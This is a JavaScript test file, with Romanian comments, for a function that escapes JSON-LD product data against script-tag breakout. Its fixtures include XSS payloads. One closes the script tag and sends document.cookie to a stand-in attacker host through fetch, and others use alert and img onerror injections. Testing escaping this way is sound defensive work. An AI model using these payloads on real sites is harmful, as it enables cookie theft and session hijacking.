import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { jsonLdSafe } from "./json-ld";

const SEP_LINIE = String.fromCharCode(0x2028);
const SEP_PARAGRAF = String.fromCharCode(0x2029);

describe("jsonLdSafe inchide evadarea din <script>", () => {
  test("un nume de produs nu mai poate inchide eticheta", () => {
    const atac = `Tricou</script><script>fetch('https://evil.tld?c='+document.cookie)</script>`;
    const iesire = jsonLdSafe({ name: atac });

    // Nimic din ce ar putea inchide sau deschide o eticheta nu supravietuieste.
    assert.ok(!iesire.includes("</script"), "a ramas o inchidere de eticheta");
    assert.ok(!iesire.includes("<"), "a ramas un < neescapat");
    assert.ok(!iesire.includes(">"), "a ramas un > neescapat");
  });

  test("ramane JSON valid si valoarea se citeste inapoi NESCHIMBATA", () => {
    const atac = `Tricou</script><script>alert(1)</script>`;
    const dus = JSON.parse(jsonLdSafe({ name: atac }));
    assert.equal(dus.name, atac, "Google trebuie sa vada exact textul original");
  });

  test("escapeaza si & (entitati HTML)", () => {
    const iesire = jsonLdSafe({ name: "Sare & Piper" });
    assert.ok(!iesire.includes("&"));
    assert.equal(JSON.parse(iesire).name, "Sare & Piper");
  });

  test("escapeaza separatorii U+2028/U+2029 care rup JavaScript", () => {
    const text = `linia1${SEP_LINIE}linia2${SEP_PARAGRAF}linia3`;
    const iesire = jsonLdSafe({ name: text });
    assert.ok(!iesire.includes(SEP_LINIE));
    assert.ok(!iesire.includes(SEP_PARAGRAF));
    assert.equal(JSON.parse(iesire).name, text);
  });

  test("NU strica textul obisnuit (spatii, diacritice, cifre)", () => {
    const obiect = {
      name: "Saltea ortopedica 160x200 cm",
      description: "Confort sporit, husa detasabila. Pret redus!",
      sku: "SLT-160/200",
      price: 1299.99,
      gtin: "5941234567890",
    };
    // Spatiile trebuie sa ramana spatii — regexul gresit de dinainte le inlocuia.
    assert.ok(jsonLdSafe(obiect).includes("Saltea ortopedica 160x200 cm"));
    assert.deepEqual(JSON.parse(jsonLdSafe(obiect)), obiect);
  });

  test("merge pe structuri imbricate (oferte, brand, breadcrumb)", () => {
    const jsonLd = {
      "@context": "https://schema.org",
      "@type": "Product",
      name: "X</script><img src=x onerror=alert(1)>",
      brand: { "@type": "Brand", name: "Marca</script>" },
      offers: [{ "@type": "Offer", price: "10", sku: "</script>" }],
    };
    const iesire = jsonLdSafe(jsonLd);
    assert.ok(!iesire.includes("<"));
    assert.deepEqual(JSON.parse(iesire), jsonLd);
  });
});
